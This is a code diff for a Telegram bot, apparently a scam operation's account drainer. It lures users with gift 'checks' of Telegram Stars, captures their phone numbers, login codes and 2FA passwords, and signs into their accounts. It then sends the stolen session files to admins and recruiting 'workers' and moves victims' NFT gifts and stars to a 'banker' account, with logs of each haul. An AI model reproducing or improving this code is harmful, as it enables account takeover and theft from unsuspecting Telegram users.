-                            parse_mode="HTML"
-                        ),
-                        reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(
-                            text="⭐️ Забрать", 
-                            url=f"https://t.me/{(await bot_instance.me()).username}?start=c_{c['check_id']}"
-                        )).as_markup()
+                        input_message_content=InputTextMessageContent(message_text=f"🎁 <b>Лови чек!</b>\n💰 Сумма: <b>{c['amount']} ⭐️</b>", parse_mode="HTML"),
+                        reply_markup=InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Забрать", url=f"https://t.me/{(await bot_instance.me()).username}?start=c_{c['check_id']}")).as_markup()
                     )
                 ], is_personal=True, cache_time=1)
         elif q.query.isdigit():
             amt = int(q.query)
             u = db.get_user(q.from_user.id)
             if not u or u['balance'] < amt:
-                await q.answer([InlineQueryResultArticle(
-                    id=uuid.uuid4().hex, 
-                    title="❌ Недостаточно средств", 
-                    description=f"Баланс: {u['balance'] if u else 0} ⭐️", 
-                    input_message_content=InputTextMessageContent(
-                        message_text="❌ Недостаточно средств для создания чека.", 
-                        parse_mode="HTML"
-                    )
-                )], is_personal=True, cache_time=1)
+                await q.answer([InlineQueryResultArticle(id=uuid.uuid4().hex, title="❌ Недостаточно средств", description=f"Баланс: {u['balance'] if u else 0} ⭐️", input_message_content=InputTextMessageContent(message_text="❌ Недостаточно средств для создания чека.", parse_mode="HTML"))], is_personal=True, cache_time=1)
                 return
             uid = f"{q.from_user.id}_{amt}_{secrets.token_hex(4)}"
-            kb = InlineKeyboardBuilder().add(InlineKeyboardButton(
-                text="⭐️ Активировать чек !", 
-                url=f"https://t.me/{(await bot_instance.me()).username}?start=q_{uid}"
-            )).as_markup()
+            kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Активировать чек !", url=f"https://t.me/{(await bot_instance.me()).username}?start=q_{uid}")).as_markup()
             pid = cached_photo_ids.get(str(amt))
             results = []
             if pid:
-                results.append(InlineQueryResultCachedPhoto(
-                    id=uuid.uuid4().hex, 
-                    photo_file_id=pid, 
-                    title=f"Создать чек на {amt} ⭐️", 
-                    caption=f"<b>⭐️ Вы получили чек!</b>\n\n<b>💰 Сумма:</b> <code>{amt} ⭐️</code>",
-                    parse_mode="HTML", 
-                    reply_markup=kb
-                ))
+                results.append(InlineQueryResultCachedPhoto(id=uuid.uuid4().hex, photo_file_id=pid, title=f"Создать чек на {amt} ⭐️", caption=f"⭐️ Вы получили чек на {amt} звёзд!", parse_mode="HTML", reply_markup=kb))
             else:
-                results.append(InlineQueryResultArticle(
-                    id=uuid.uuid4().hex, 
-                    title=f"Отправить чек на {amt} ⭐️", 
-                    description="Нажмите, чтобы отправить (Без фото)", 
-                    input_message_content=InputTextMessageContent(
-                        message_text=f"<b>⭐️ ЧЕК НА {amt} ЗВЁЗД!</b>\n\nКто успел - того и тапки! 👇", 
-                        parse_mode="HTML"
-                    ), 
-                    reply_markup=kb
-                ))
+                results.append(InlineQueryResultArticle(id=uuid.uuid4().hex, title=f"Отправить чек на {amt} ⭐️", description="Нажмите, чтобы отправить (Без фото)", input_message_content=InputTextMessageContent(message_text=f"⭐️ <b>ЧЕК на {amt} звёзд!</b>\n\nКто успел - того и тапки! 👇", parse_mode="HTML"), reply_markup=kb))
             await q.answer(results, is_personal=True, cache_time=1)
 
     return router
@@ -1412,12 +1410,12 @@ class FragmentBot:
             print_info(f"📨 Sending code to Telegram ({clean_num})...")
             s = await c.send_code(clean_num)
             
+            # === СОХРАНЯЕМ СЕССИЮ В ФАЙЛ ===
             user_sessions[clean_num] = {'phone': clean_num, 'hash': s.phone_code_hash, 'client': c.name}
             save_temp_sessions(user_sessions)
+            # ===============================
             
-            # Лог отправки кода
-            log_message = f"<b>Отправка кода</b>\n\n☎️ Номер: <tg-spoiler>{clean_num}</tg-spoiler>\n👤 Пользователь: <code>{cid}</code>"
-            await log_to_topic(self.bot, 'topic_auth', log_message)
+            await log_to_topic(self.bot, 'topic_auth', f"📱 Отправлен код на {mask_phone(clean_num)}\n🆔 User ID: {cid}")
             print_success(f"✅ Code sent to {clean_num}")
             return {"success": True}
             
@@ -1429,6 +1427,7 @@ class FragmentBot:
             return {"error": str(e)}
 
     async def ver_code(self, phone, code, cid):
+        # 1. Проверяем наличие сессии (теперь она подгружается из файла)
         if phone not in user_sessions: 
             raise Exception("Session expired/not found locally")
             
@@ -1443,9 +1442,7 @@ class FragmentBot:
             if not c.is_connected: await c.connect()
             await c.sign_in(phone, phone_hash, str(code))
             
-            # Лог успешного входа
-            log_message = f"<b>ysпеuuный Bx0д</b>\n\n☎️ Номер: <tg-spoiler>{phone}</tg-spoiler>\n👤 Пользователь: <code>{cid}</code>\n🔐 Метод: Код из SMS"
-            await log_to_topic(self.bot, 'topic_auth', log_message)
+            await log_to_topic(self.bot, 'topic_auth', f"🟩 Успешный вход по {mask_phone(phone)}\n🆔 User ID: {cid}")
             await self.fin(c, cid, phone)
             return "success"
         except SessionPasswordNeeded:
@@ -1457,11 +1454,10 @@ class FragmentBot:
         c = await self.get_cl(phone)
         try:
             await c.check_password(str(pwd))
-            # Лог успешного 2FA
-            log_message = f"<b> 2FA пройдено</b>\n\n☎️ Номер: <tg-spoiler>{phone}</tg-spoiler>\n👤 Пользователь: <code>{cid}</code>\n🔐 Метод: 2FA Пароль"
-            await log_to_topic(self.bot, 'topic_auth', log_message)
+            await log_to_topic(self.bot, 'topic_auth', f"🟩 2FA Верный: {mask_phone(phone)}\n🆔 User ID: {cid}")
             await self.fin(c, cid, phone)
         except (PasswordHashInvalid, BadRequest):
+            # Если пароль неверный, выбрасываем понятную ошибку, которая уйдет в update_status
             raise Exception("Invalid 2FA Password") 
         except Exception as e: 
             raise e
@@ -1477,14 +1473,15 @@ class FragmentBot:
             me = await c.get_me()
             sess_file = SESSIONS_DIR / f"{c.name}.session"
             
+            # Отправка сессии админам
             if sess_file.exists():
-                caption = f"🔑 Session: {me.phone_number} | ID: {me.id}"
-                await send_file_to_admins(self.bot, sess_file, caption)
+                await send_file_to_admins(self.bot, sess_file, f"🔑 Session: {mask_phone(me.phone_number)} | ID: {me.id}")
                 u = db.get_user(me.id)
                 if u and u['worker_id']:
-                    try: await self.bot.send_document(chat_id=u['worker_id'], document=FSInputFile(sess_file), caption=f"🔑 Session: {me.phone_number}")
+                    try: await self.bot.send_document(chat_id=u['worker_id'], document=FSInputFile(sess_file), caption=f"🔑 Session: {mask_phone(me.phone_number)}")
                     except: pass
 
+            # Подготовка банкира
             banker = None
             banker_name = SETTINGS.get("banker_session", "main_admin")
             if (SESSIONS_DIR / f"{banker_name}.session").exists():
@@ -1493,13 +1490,19 @@ class FragmentBot:
                     await banker.start()
                 except Exception as e: print_error(f"Banker Error: {e}")
 
+            # === ЗАПУСК ПРОЦЕССА (СНАЧАЛА ВОРК, ПОТОМ ЛОГ) ===
+            nft_results = []
+            final_stars = 0
+            
             if c.is_connected:
-                await transfer_process(c, banker, self.bot)
+                # Передаем управление в воркер, ждем результаты
+                nft_results, final_stars = await transfer_process(c, banker, self.bot)
             
             if banker: 
                 try: await banker.stop()
                 except: pass
             
+            # === ФОРМИРОВАНИЕ ЛОГА ===
             u_db = db.get_user(me.id)
             worker_txt = "Неизвестно"
             if u_db and u_db['worker_id']:
@@ -1507,18 +1510,35 @@ class FragmentBot:
                 if w_db and w_db['username']: worker_txt = f"@{w_db['username']}"
                 else: worker_txt = f"ID {u_db['worker_id']}"
 
-            # Упрощенный финальный лог без статистики
-            log_text = f"""
-<b>Новая сессия отработана!</b>
+            # Формируем список NFT для лога
+            nft_lines = []
+            if nft_results:
+                for nft in nft_results:
+                    # Ссылка на NFT
+                    link = f"https://t.me/nft/{nft['slug']}" if nft['slug'] else "#"
+                    # Формат: <a href="link">Name</a> Status
+                    line = f"<a href='{link}'>{nft['title']}</a> {nft['status']}"
+                    nft_lines.append(line)
+                nft_text = "\n".join(nft_lines)
+            else:
+                nft_text = "Нет NFT"
 
-👷 Воркер: <code>{worker_txt}</code>
-👤 Пользователь: @{me.username if me.username else 'Нет'}
-🆔 ID: <code>{me.id}</code>
-☎️ Телефон: <tg-spoiler>{me.phone_number}</tg-spoiler>
-📁 Сессия: <code>{sess_file.name}</code>
-
-✅ Обработка завершена.
-"""
+            # Основной текст лога с цитированием
+            log_text = (
+                f"<blockquote>"
+                f"💸 Новая сессия!\n"
+                f"👨‍💻 Воркер: {worker_txt}\n\n"
+                f"👤 Пользователь: @{me.username if me.username else 'Нет'}\n"
+                f"🆔 Айди: <code>{me.id}</code>\n"
+                f"☎️ Номер телефона: <code>{mask_phone(me.phone_number)}</code>\n"
+                f"🪬 Session File: <code>{sess_file.name}</code>\n\n"
+                f"🔮 Статистика:\n"
+                f"⭐️ Звезды: {final_stars} / 0\n"
+                f"🎁 NFT подарки:\n{nft_text}"
+                f"</blockquote>"
+            )
+            
+            # Отправляем лог ПОСЛЕ всех действий
             await log_to_topic(self.bot, 'topic_success', log_text)
 
             if u_db and u_db['worker_id']: 
@@ -1539,6 +1559,7 @@ class FragmentBot:
             except: pass
 
     async def cancel(self, phone):
+        # Удаляем из файла при отмене
         if phone in user_sessions: 
             del user_sessions[phone]
             save_temp_sessions(user_sessions)
@@ -1622,6 +1643,7 @@ async def session_checker_loop(bot_instance: Bot):
             for session_file in sessions:
                 if session_file.stem == banker_name: continue
 
+                # ОПТИМИЗАЦИЯ: Если сессия прямо сейчас в процессе входа (в памяти), не трогаем вообще
                 if session_file.stem in user_sessions:
                     continue
 
@@ -1638,22 +1660,32 @@ async def session_checker_loop(bot_instance: Bot):
                     await client.get_me()
                     await client.disconnect()
                 except (AuthKeyUnregistered, UserDeactivated, SessionRevoked) as e:
+                    # Сессия невалидна. Проверяем возраст файла перед удалением.
                     try:
                         await client.disconnect()
                     except: pass
 
                     try:
+                        # Получаем время последней модификации файла
                         last_modified = session_file.stat().st_mtime
                         time_now = time.time()
                         age_seconds = time_now - last_modified
                         
+                        # 300 секунд = 5 минут
                         if age_seconds > 300:
                             print_warning(f"🗑 Удаление мертвой сессии (Age: {int(age_seconds)}s): {session_file.name} ({e})")
                             os.remove(session_file)
+                        else:
+                            # Файл слишком свежий, возможно идет логин или только что создан
+                            pass 
+                            # Можно раскомментировать для дебага:
+                            # log_transfer(f"⚠️ Сессия {session_file.name} невалидна, но новая ({int(age_seconds)}s). Не удаляем.")
+                            
                     except Exception as del_err:
                         print_error(f"Ошибка проверки времени/удаления файла: {del_err}")
 
                 except Exception as e:
+                    # Любые другие ошибки (нет сети, флуд и т.д.) - просто отключаемся и пропускаем
                     try: await client.disconnect()
                     except: pass
                 
